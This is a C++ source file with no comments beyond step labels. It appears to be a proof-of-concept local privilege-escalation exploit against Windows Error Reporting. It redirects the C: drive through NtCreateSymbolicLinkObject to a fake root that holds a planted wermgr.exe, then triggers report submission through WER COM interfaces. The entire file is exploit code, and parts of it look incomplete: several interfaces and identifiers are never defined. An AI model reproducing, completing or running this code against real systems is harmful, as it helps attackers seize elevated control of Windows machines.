#include <Windows.h>
#include <iostream>

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

extern "C" NTSTATUS WINAPI NtCreateSymbolicLinkObject(
    PHANDLE LinkHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PUNICODE_STRING TargetName
);

int main() {
    // Set up dummy Report.wer file
    CreateDirectoryA("C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\WER1CF4123", NULL);
    FILE *dummyFile = fopen("C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\WER1CF4123\\Report.wer", "w");
    if (dummyFile != NULL) {
        fclose(dummyFile);
    }

    // Set up fake root hierarchy
    CreateDirectoryA("C:\\Users\\public\\test\\Windows\\System32", NULL);
    CopyFileA("exploit.exe", "C:\\Users\\public\\test\\Windows\\System32\\wermgr.exe", FALSE);
    CreateDirectoryA("C:\\Users\\Public\\test\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\WER1CF4123", NULL);
    FILE *dummyReport = fopen("C:\\Users\\Public\\test\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive\\WER1CF4123\\Report.wer", "w");
    if (dummyReport != NULL) {
        fclose(dummyReport);
    }

    // Create redirection using NtCreateSymbolicLinkObject
    NTSTATUS status;
    HANDLE hLink;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING linkName, targetName;
    RtlInitUnicodeString(&linkName, L"\\??\\C:");
    RtlInitUnicodeString(&targetName, L"\\GLOBAL??\\C:\\Users\\Public\\test");
    InitializeObjectAttributes(&oa, &linkName, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_QUERY, &oa, &targetName);
    if (status != STATUS_SUCCESS) {
        return -1;
    }

    // Initialize COM
    CoInitialize(NULL);

   // Create COM interfaces and exploit steps
    IWerReport* pIWerReport = nullptr;
    IErcLuaSupport* pIErcLuaSupport = nullptr;
    IWerStoreFactory* pIWerStoreFactory = nullptr;
    IWerStore* pIWerStore = nullptr;

    CoCreateInstance(CLSID_ERCLuaSupport, NULL, CLSCTX_LOCAL_SERVER, IID_IErcLuaSupport, (PVOID*)&pIErcLuaSupport);
    pIErcLuaSupport->CoCreateIWerStoreFactory(&pIWerStoreFactory);
    pIWerStoreFactory->CoCreateIWerStore(&pIWerStore);
    pIWerStore->EnumerateStart();
    pIWerStore->LoadReport(L"WER1CF4123", &pIWerReport);
    pIWerReport->SubmitReport();

    // Clean up COM interfaces
    pIWerReport->Release();
    pIWerStore->Release();
    pIWerStoreFactory->Release();
    pIErcLuaSupport->Release();
    // Uninitialize COM
    CoUninitialize();

    return 0;
}
